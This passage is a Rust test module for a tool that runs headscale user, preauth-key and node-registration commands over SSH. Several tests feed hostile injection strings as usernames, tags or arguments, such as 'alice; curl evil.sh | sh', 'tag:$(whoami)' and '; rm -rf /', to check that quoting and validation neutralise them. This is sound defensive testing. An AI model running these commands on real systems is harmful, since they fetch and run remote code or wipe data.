        assert!(list_nodes(&mock).unwrap().is_empty());
    }

    /// The bug this file was rewritten for, asserted through the sequence that
    /// held it: the id the create response carried is what reaches
    /// `preauthkeys create`, and the username appears nowhere in that command
    /// line.
    #[test]
    fn add_user_mints_the_key_against_the_new_users_id() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USER_CREATED_JSON));
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));

        let (user, key) = add_user(&mock, "sripwoud", "24h", &[]).unwrap();
        assert_eq!(user.id, 7);
        assert_eq!(key, "abcdef123456");

        assert_eq!(
            mock.calls(),
            vec![
                SshOp::Run("sudo headscale users create sripwoud -o json".to_string()),
                SshOp::Run(
                    "sudo headscale preauthkeys create --user 7 --expiration 24h -o json"
                        .to_string()
                ),
            ]
        );
    }

    /// #711's threading, the same shape #707 broke: the id reaching
    /// `preauthkeys create` is the one the *listing* carried for the given
    /// name, the name itself appears in no command line, and the tags ride
    /// along.
    #[test]
    fn add_key_mints_against_the_id_the_listing_carried() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USERS_LIST_JSON));
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));

        let user = find_user(&mock, "bob").unwrap();
        let key = mint_preauth_key(&mock, user.id, "48h", &["tag:server".to_string()]).unwrap();
        assert_eq!(key, "abcdef123456");

        assert_eq!(
            mock.calls(),
            vec![
                SshOp::Run("sudo headscale users list -o json".to_string()),
                SshOp::Run(
                    "sudo headscale preauthkeys create --user 2 --expiration 48h \
                     --tags 'tag:server' -o json"
                        .to_string()
                ),
            ]
        );
    }

    #[test]
    fn parse_auth_id_reads_the_id_off_the_register_url() {
        assert_eq!(
            parse_auth_id("https://hs.example.com/register/hskey-authreq-x7K9m2P4qL8wN3vB5tR6yH1z")
                .unwrap(),
            "hskey-authreq-x7K9m2P4qL8wN3vB5tR6yH1z"
        );
    }

    /// headscale mints the suffix with raw-URL-safe base64 (`A-Za-z0-9-_`),
    /// so roughly half of real 24-char ids carry a `-` or `_` — an
    /// alphanumerics-only validator rejects them.
    #[test]
    fn parse_auth_id_accepts_base64url_hyphen_and_underscore() {
        assert_eq!(
            parse_auth_id("https://hs.example.com/register/hskey-authreq-SvQJJKDl7-MMF_Zokgzck2PJ")
                .unwrap(),
            "hskey-authreq-SvQJJKDl7-MMF_Zokgzck2PJ"
        );
    }

    #[test]
    fn parse_auth_id_tolerates_a_trailing_slash() {
        assert_eq!(
            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123/").unwrap(),
            "hskey-authreq-abc123"
        );
    }

    #[test]
    fn parse_auth_id_accepts_the_bare_id() {
        assert_eq!(
            parse_auth_id("hskey-authreq-abc123").unwrap(),
            "hskey-authreq-abc123"
        );
    }

    /// A chat client or share sheet can append tracking params or a fragment
    /// to the pasted URL; the id survives them.
    #[test]
    fn parse_auth_id_strips_a_query_string_or_fragment() {
        assert_eq!(
            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123?utm_source=x")
                .unwrap(),
            "hskey-authreq-abc123"
        );
        assert_eq!(
            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123/#top").unwrap(),
            "hskey-authreq-abc123"
        );
    }

    /// Rejection is local and names both accepted shapes — no SSH round trip
    /// happens for input that is neither.
    #[test]
    fn parse_auth_id_rejects_garbage_naming_both_shapes() {
        for garbage in [
            "not-an-auth-id",
            "hskey-authreq-",
            "hskey-authreq-abc;rm -rf /",
            "https://hs.example.com/register/",
            "",
        ] {
            let err = parse_auth_id(garbage).unwrap_err();
            let msg = err.to_string();
            assert!(msg.contains("register URL"), "{garbage:?}: {msg}");
            assert!(msg.contains("hskey-authreq-"), "{garbage:?}: {msg}");
        }
    }

    /// #724's threading, in add-key's shape: the name the *listing* carried is
    /// what reaches `auth register`, after exactly two remote commands.
    #[test]
    fn register_approves_the_enrollment_for_the_listed_user() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USERS_LIST_JSON));
        mock.stage_run_result(CommandResult::from_stdout("Node lechuck registered"));

        let user = find_user(&mock, "alice").unwrap();
        let response = register_node(&mock, "hskey-authreq-abc123", &user.name).unwrap();
        assert_eq!(response, "Node lechuck registered");

        assert_eq!(
            mock.calls(),
            vec![
                SshOp::Run("sudo headscale users list -o json".to_string()),
                SshOp::Run(
                    "sudo headscale auth register --auth-id hskey-authreq-abc123 --user alice"
                        .to_string()
                ),
            ]
        );
    }

    /// A name from the picker comes from headscale's own store, where an OIDC
    /// claim or `users rename` can put anything; it reaches a `sudo` command
    /// line here, so it rides quoted (the `remove-user` lesson).
    #[test]
    fn a_store_username_cannot_break_out_of_the_register_command_line() {
        let mock = MockSshSession::new();
        register_node(&mock, "hskey-authreq-abc123", "alice; curl evil.sh | sh").unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run(
                "sudo headscale auth register --auth-id hskey-authreq-abc123 \
                 --user 'alice; curl evil.sh | sh'"
                    .to_string()
            )]
        );
    }

    /// The one `auth register` failure auberge translates (#729): headscale
    /// names the data structure it missed in, which reads like a bad auth-id
    /// or a bad user when it is neither. The window and the remedy lead;
    /// headscale's own text stays under them as the source.
    #[test]
    fn register_names_the_window_when_the_registration_cache_has_no_such_enrollment() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult {
            success: false,
            exit_code: Some(1),
            stdout: Vec::new(),
            stderr: b"Error: registering node: rpc error: code = Unknown desc = \
                      node not found in registration cache"
                .to_vec(),
        });

        let err = register_node(&mock, "hskey-authreq-abc123", "alice").unwrap_err();
        let chain = format!("{err:#}");

        assert!(chain.contains("15 minutes"), "{chain}");
        assert!(chain.contains("Restart the login on the device"), "{chain}");
        assert!(
            chain.contains("node not found in registration cache"),
            "headscale's own text must survive as the source: {chain}"
        );
        assert!(
            chain.contains("headscale auth register"),
            "the command that failed must survive too: {chain}"
        );
    }

    /// The translation lives in `register_node` and nowhere below it. The
    /// registration cache belongs to the `auth register` flow, while
    /// [`run_headscale_cmd`] carries eight other command lines — a remedy
    /// naming a login on a device is nonsense under `users destroy`.
    ///
    /// Without this the placement is guarded only by a doc comment: moving the
    /// `map_err` down into the generic runner leaves every other test green.
    #[test]
    fn the_generic_runner_translates_nothing_the_register_flow_owns() {
        let cache_miss = b"Error: node not found in registration cache";

        let direct = MockSshSession::new();
        direct.stage_run_result(CommandResult {
            success: false,
            exit_code: Some(1),
            stdout: Vec::new(),
            stderr: cache_miss.to_vec(),
        });
        let err = run_headscale_cmd(&direct, "users destroy ghost --force").unwrap_err();
        let chain = format!("{err:#}");
        assert!(
            chain.contains("node not found in registration cache"),
            "the runner still reports what headscale said: {chain}"
        );
        assert!(
            !chain.contains("15 minutes"),
            "the runner must not carry register's remedy: {chain}"
        );

        let through_caller = MockSshSession::new();
        through_caller.stage_run_result(CommandResult {
            success: false,
            exit_code: Some(1),
            stdout: Vec::new(),
            stderr: cache_miss.to_vec(),
        });
        let err = destroy_user(&through_caller, "ghost").unwrap_err();
        assert!(
            !format!("{err:#}").contains("15 minutes"),
            "nor may a sibling caller inherit it: {err:#}"
        );
    }

    /// Only that one string is translated. Every other `auth register` failure
    /// reaches the operator as headscale wrote it — a guess about a failure
    /// auberge has not read is worse than the raw text.
    #[test]
    fn register_passes_every_other_headscale_failure_through_verbatim() {
        for stderr in [
            "Error: user not found",
            "Error: failed to connect to headscale: connection refused",
            "Error: registering node: rpc error: code = Unknown desc = node already registered",
        ] {
            let mock = MockSshSession::new();
            mock.stage_run_result(CommandResult {
                success: false,
                exit_code: Some(1),
                stdout: Vec::new(),
                stderr: stderr.as_bytes().to_vec(),
            });

            let err = register_node(&mock, "hskey-authreq-abc123", "alice").unwrap_err();
            let chain = format!("{err:#}");

            assert!(chain.contains(stderr), "{stderr:?}: {chain}");
            assert!(
                !chain.contains("15 minutes"),
                "{stderr:?} is not a cache miss: {chain}"
            );
        }
    }

    /// add-key mutates nothing, so a name the store does not carry stops the
    /// sequence at the listing — and points at the command that creates users.
    #[test]
    fn find_user_refuses_a_name_the_listing_does_not_carry() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USERS_LIST_JSON));
        let err = find_user(&mock, "ghost").unwrap_err();
        assert!(err.to_string().contains("add-user"), "{err}");
    }

    /// A name auberge never validated — the picker takes it from headscale's
    /// own store — reaches a `sudo` command line, so it is quoted there.
    #[test]
    fn a_username_from_the_picker_cannot_break_out_of_the_command_line() {
        let mock = MockSshSession::new();
        destroy_user(&mock, "alice; curl evil.sh | sh").unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run(
                "sudo headscale users destroy --name \'alice; curl evil.sh | sh\' --force"
                    .to_string()
            )]
        );
    }

    /// Quoting is not allowed to change the ordinary case, which every other
    /// command-line assertion in this module is written against.
    #[test]
    fn quoting_leaves_an_ordinary_username_untouched() {
        assert_eq!(quote("alice"), "alice");
        assert_eq!(quote("bob-123_x"), "bob-123_x");
    }

    /// `--tags` on 0.29.3 is a cobra `StringSlice`, so one comma-joined value
    /// carries them all — and `:` is outside shell-escape's whitelist, so the
    /// value rides the command line quoted.
    #[test]
    fn add_user_stamps_tags_on_the_minted_key() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(USER_CREATED_JSON));
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));

        let tags = vec!["tag:server".to_string(), "tag:exit-node".to_string()];
        add_user(&mock, "sripwoud", "24h", &tags).unwrap();

        assert_eq!(
            mock.calls()[1],
            SshOp::Run(
                "sudo headscale preauthkeys create --user 7 --expiration 24h \
                 --tags 'tag:server,tag:exit-node' -o json"
                    .to_string()
            )
        );
    }

    /// No tags means no `--tags` at all: an empty `StringSlice` value is not
    /// the same thing as an absent flag.
    #[test]
    fn the_tags_flag_is_absent_when_no_tags_were_given() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));
        mint_preauth_key(&mock, 7, "24h", &[]).unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run(
                "sudo headscale preauthkeys create --user 7 --expiration 24h -o json".to_string()
            )]
        );
    }

    /// `validateTag` on the server accepts `tag:$(whoami)` — lowercase, no
    /// spaces — so validation cannot be the shell defense; quoting is.
    #[test]
    fn a_hostile_tag_cannot_break_out_of_the_command_line() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));
        mint_preauth_key(&mock, 7, "24h", &["tag:$(whoami)".to_string()]).unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run(
                "sudo headscale preauthkeys create --user 7 --expiration 24h \
                 --tags 'tag:$(whoami)' -o json"
                    .to_string()
            )]
        );
    }

    /// The rule is headscale's own `validateTag`, applied before the SSH round
    /// trip: a server-side rejection on add-user would land after `users
    /// create` has already mutated the store.
    #[test]
    fn validate_tag_mirrors_headscales_rule() {
        assert!(validate_tag("tag:server").is_ok());
        assert!(validate_tag("tag:exit-node").is_ok());
        assert!(validate_tag("server").is_err());
        assert!(validate_tag("tag:Server").is_err());
        assert!(validate_tag("tag:a b").is_err());
        assert!(validate_tag("tag:").is_err());
        assert!(validate_tag("tag:a,b").is_err());
    }

    /// `--user` is a `uint` on 0.29.3, so a username there is a value cobra
    /// rejects — after the user has already been created.
    #[test]
    fn the_preauthkey_command_never_carries_a_username() {
        let mock = MockSshSession::new();
        mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));
        mint_preauth_key(&mock, 7, "24h", &[]).unwrap();
        let SshOp::Run(command) = &mock.calls()[0] else {
            panic!("preauthkeys create must reach the Host as a run");
        };
        assert!(!command.contains("sripwoud"), "{command}");
    }

    #[test]
    fn destroy_user_resolves_by_name_and_answers_the_prompt() {
        let mock = MockSshSession::new();
        destroy_user(&mock, "alice").unwrap();
        assert_eq!(
            mock.calls(),
            vec![SshOp::Run(
                "sudo headscale users destroy --name alice --force".to_string()
            )]
        );
    }

    #[test]
    fn node_display_joins_ips() {
        let node = HeadscaleNode {
            id: 1,
            given_name: "test".to_string(),
            ip_addresses: vec!["100.64.0.1".to_string(), "fd7a:115c:a1e0::1".to_string()],
            user: HeadscaleNodeUser {
                name: "alice".to_string(),
            },
            last_seen: Some(ProtoTimestamp {
                seconds: 1735689600,
                nanos: 0,
            }),
            online: true,
        };
        let display = NodeDisplay::from(&node);
        assert_eq!(display.ips, "100.64.0.1, fd7a:115c:a1e0::1");
        assert_eq!(display.online, "yes");
    }

    #[test]
    fn node_display_offline_shows_no() {
        let node = HeadscaleNode {
            id: 1,
            given_name: "test".to_string(),
            ip_addresses: vec![],
            user: HeadscaleNodeUser {
                name: "alice".to_string(),
            },
            last_seen: None,
            online: false,
        };
        let display = NodeDisplay::from(&node);
        assert_eq!(display.online, "no");
        assert_eq!(display.last_seen, "");
    }

    #[test]
    fn user_display_from_headscale_user() {
        let user = HeadscaleUser {
            id: 42,
            name: "carol".to_string(),
            created_at: Some(ProtoTimestamp {
                seconds: 1710504000,
                nanos: 0,
            }),
        };
        let display = UserDisplay::from(&user);
        assert_eq!(display.id, "42");
        assert_eq!(display.name, "carol");
        assert!(display.created_at.contains("2024-03-15"));
    }

    #[test]
    fn proto_timestamp_to_rfc3339() {
        let ts = ProtoTimestamp {
            seconds: 1735689600,
            nanos: 0,
        };
        assert_eq!(ts.to_rfc3339(), "2025-01-01 00:00:00 UTC");
    }

    #[test]
    fn strip_ssh_banner_removes_banner() {
        let output = "************\n* AUTHORIZED *\n************\n{\"key\": \"abc\"}";
        let stripped = strip_ssh_banner(output);
        assert_eq!(stripped, "{\"key\": \"abc\"}");
    }

    #[test]
    fn strip_ssh_banner_no_banner() {
        let output = "{\"key\": \"abc\"}";
        let stripped = strip_ssh_banner(output);
        assert_eq!(stripped, "{\"key\": \"abc\"}");
    }

    #[test]
    fn validate_username_accepts_valid() {
        assert!(validate_username("alice").is_ok());
        assert!(validate_username("bob-123").is_ok());
        assert!(validate_username("user_name").is_ok());
    }

    #[test]
    fn validate_username_rejects_invalid() {
        assert!(validate_username("").is_err());
        assert!(validate_username("alice; rm -rf /").is_err());
        assert!(validate_username("user name").is_err());
        assert!(validate_username("$(whoami)").is_err());
    }

    #[test]
    fn validate_expiration_accepts_valid() {
        assert!(validate_expiration("1h").is_ok());
        assert!(validate_expiration("24h").is_ok());
        assert!(validate_expiration("7d").is_ok());
    }

    #[test]
    fn validate_expiration_rejects_invalid() {
        assert!(validate_expiration("; rm -rf /").is_err());
        assert!(validate_expiration("24h; whoami").is_err());
    }

    fn named_host(name: &str) -> Host {
        Host {
            name: name.to_string(),
            address: "203.0.113.1".to_string(),
            user: "admin".to_string(),
            port: 22,
            ssh_key: None,
            tags: vec![],
            description: None,
            python_interpreter: None,
            become_method: "sudo".to_string(),
            tailscale_ip: None,
        }
    }

    #[test]
    fn only_serving_host_picks_the_host_whose_config_answers_the_gate() {
        let config = Config::from_toml_str(
            r#"
            headscale_subdomain = "hs"

            [hosts.ruche]
            headscale_subdomain = ""

            [hosts.vieille]
            headscale_subdomain = ""
        "#,
        )
        .unwrap();
        let hosts = [
            named_host("auberge"),
            named_host("ruche"),
            named_host("vieille"),
        ];
        assert_eq!(only_serving_host(&hosts, &config).unwrap().name, "auberge");
    }

    #[test]
    fn only_serving_host_is_none_while_several_hosts_answer() {
        let config = Config::from_toml_str(r#"headscale_subdomain = "hs""#).unwrap();
        let hosts = [named_host("auberge"), named_host("ruche")];
        assert!(only_serving_host(&hosts, &config).is_none());
    }

    #[test]
    fn only_serving_host_is_none_when_no_host_answers() {
        let config = Config::from_toml_str(r#"domain = "example.com""#).unwrap();
        let hosts = [named_host("auberge")];
        assert!(only_serving_host(&hosts, &config).is_none());
    }

    #[test]
    fn only_serving_host_reads_a_host_scoped_answer() {
        let config = Config::from_toml_str(
            r#"
            [hosts.auberge]
            headscale_subdomain = "hs"
        "#,
        )
        .unwrap();
        let hosts = [named_host("auberge"), named_host("ruche")];
        assert_eq!(only_serving_host(&hosts, &config).unwrap().name, "auberge");
    }
}
